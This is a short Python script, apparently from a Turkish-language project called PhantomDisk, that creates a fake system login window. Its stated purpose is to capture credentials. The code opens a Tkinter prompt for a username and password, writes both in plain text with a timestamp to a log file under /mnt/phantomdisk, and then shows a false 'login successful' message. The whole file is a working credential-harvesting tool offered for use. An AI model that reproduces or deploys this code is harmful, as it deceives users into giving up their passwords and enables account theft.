#!/usr/bin/env python3
"""
PhantomDisk - Sahte Login Ekranı (GhostLogin)
Geliştirici: burakcanbalta | 2025
Amaç: RAM üzerinde çalışan sahte bir giriş ekranı göstererek giriş bilgilerini kaydetmek.
"""

import tkinter as tk
from tkinter import messagebox
import time
import os

PHANTOM_PATH = "/mnt/phantomdisk"
LOG_FILE = os.path.join(PHANTOM_PATH, "ghostlogin.log")

def show_login_screen():
    def on_login():
        username = entry_user.get()
        password = entry_pass.get()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

        try:
            with open(LOG_FILE, "a") as log:
                log.write(f"[{timestamp}] Kullanıcı: {username} | Şifre: {password}\n")
        except Exception as e:
            print(f"[!] Log kaydedilemedi: {e}")

        messagebox.showinfo("Giriş", "Giriş başarılı! Oturum açılıyor...")
        root.destroy()

    root = tk.Tk()
    root.title("Sistem Girişi")
    root.geometry("350x200")
    root.configure(bg="black")

    tk.Label(root, text="Kullanıcı Adı:", fg="white", bg="black").pack(pady=5)
    entry_user = tk.Entry(root, width=30)
    entry_user.pack()

    tk.Label(root, text="Şifre:", fg="white", bg="black").pack(pady=5)
    entry_pass = tk.Entry(root, show="*", width=30)
    entry_pass.pack()

    tk.Button(root, text="Giriş Yap", width=20, command=on_login).pack(pady=15)
    root.mainloop()

if __name__ == "__main__":
    show_login_screen()
